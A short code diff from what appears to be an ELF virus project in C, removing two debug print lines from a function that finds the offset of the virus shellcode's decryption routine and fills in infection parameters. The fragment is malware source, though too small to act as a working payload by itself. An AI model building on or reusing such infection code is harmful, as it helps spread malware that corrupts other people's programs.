@@ -60,8 +60,6 @@ int get_virus_info(InfectParams *p){
 	elf_off_symbol(virus_shellcode, virus_shellcode_len, "DECRYPT_ROUTINE", (int64_t*)&decrypt_routine_off);
 	decrypt_routine_off -= bin_start_off; 
 
-	debug_ext("dec:", decrypt_routine_off, "\n");
-	debug_ext("off:", bin_start_off, "\n");
 	void *x = ft_malloc(1024);
 	((int*)x)[0] = 0;
 	*p = (InfectParams){v, l, cmpr_off, cmpr_len, c_off, c_len, decrypt_routine_off, x};
